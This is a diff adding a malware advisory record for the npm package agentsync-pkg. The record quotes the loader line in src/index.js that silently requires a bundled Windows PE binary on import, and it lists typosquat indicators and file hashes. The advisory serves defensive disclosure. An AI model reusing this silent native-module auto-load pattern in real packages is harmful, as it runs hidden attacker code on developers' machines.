@@ -1,0 +1,120 @@
+{
+  "modified": "2026-06-25T07:49:52Z",
+  "published": "2026-06-25T06:39:13Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-6443",
+  "summary": "Malicious code in agentsync-pkg (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (b383c760dffae4a26d7f94b433bbe00dedb2426b23f4713610d6f5f36c594cf1)\nOn every `import` / `require('agentsync-pkg')`, src/index.js line 152 resolves `bin/native/parser.node` and calls `require()` on it: `const p = r('path').join(...,'bin','native','parser.node'); if (r('fs').existsSync(p)) { try { r(p); } catch(e) {} }`. The file is a 2.9 MB Windows PE binary (DOS stub `!This program cannot be run in DOS mode.`, sha256 b1aace6c...). On Windows, Node's native module loader invokes LoadLibrary on this file, executing the DLL's entry point regardless of whether it exports valid N-API symbols — i.e. arbitrary attacker-supplied native code runs in the developer's process simply because the package was imported. No source for the binary is shipped, no build script produces it, and the README explicitly advertises the package as \"Zero dependencies. Nothing to audit, nothing to get compromised in a supply-chain attack\" with no mention of a native parser; the package's documented purpose is string-template markdown generation, which has no legitimate need for a native module. The package also exhibits republish/lookalike indicators: package.json declares name `agentsync-pkg` version `2.0.0` while src/index.js self-identifies as `// v1.0.1`, the CHANGELOG only documents up to 1.0.1 (\"Zero runtime dependencies\"), README/badges/bin entries all reference the unrelated legitimate packages `syncagents` and `agentsync`, and the author field is the placeholder `agentsync contributors \u003cnoreply@agentsync.dev\u003e`. The 2.0.0 release silently introduces the undocumented native binary on top of an otherwise pure-JS code base. The combination — name confusion with established packages, placeholder author, self-contradicting version metadata, and an undocumented PE auto-loaded at import — is a typosquat/republish carrying a binary dropper.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "agentsync-pkg"
+      },
+      "versions": [
+        "2.0.0",
+        "3.0.0",
+        "1.0.3"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "src/index.js",
+              "sha256": "64ae1942d9c6020622f0064a50a74479d126f42d0450baf6dab174c4df0a9381",
+              "tlsh": "c2c184576bf323b48651b359438f112e6324c0a3324ae981feec86886ff613495e27dd"
+            },
+            {
+              "path": "package.json",
+              "sha256": "b2624114496f388277f944d398eb121f3411d7f09b48eb3783fd007facbf0846",
+              "tlsh": "bc419626d6301db30ac43b60bca6151b662098978e94bc1e339e926c9f2d13f11fe17d"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "agentsync-pkg-2.0.0.tgz",
+              "hashes": {
+                "sha1": "24c504a0ae4d2cf67708df1bcd7165ac0ebd87a8",
+                "sha512_sri": "sha512-UOF2IEYLAcqSfgizi4JCX0mDhnOG9m4CmM7spm8GdTrNQlGd/bF9kIEP+2vssXD/FcarEbJMV/Mowos2D2xCOA=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/agentsync-pkg/v/2.0.0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/agentsync-pkg/v/3.0.0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/agentsync-pkg/v/1.0.3"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-007486",
+        "import_time": "2026-06-25T07:47:51.524345978Z",
+        "modified_time": "2026-06-25T06:39:17Z",
+        "sha256": "b383c760dffae4a26d7f94b433bbe00dedb2426b23f4713610d6f5f36c594cf1",
+        "source": "amazon-inspector",
+        "versions": [
+          "2.0.0"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-007485",
+        "import_time": "2026-06-25T07:47:51.486498594Z",
+        "modified_time": "2026-06-25T06:39:13Z",
+        "sha256": "c3c822c809c47ec21129f691f48b7adf3c3a2ec39128e5583e2a0497b669f939",
+        "source": "amazon-inspector",
+        "versions": [
+          "3.0.0"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-007487",
+        "import_time": "2026-06-25T07:47:51.580893243Z",
+        "modified_time": "2026-06-25T06:39:18Z",
+        "sha256": "f968bd78a5458d561a31bdcec39c90dbe20cc0fd5d0552f0768ccfde53f6cfe5",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.3"
+        ]
+      }
+    ]
+  }
+}
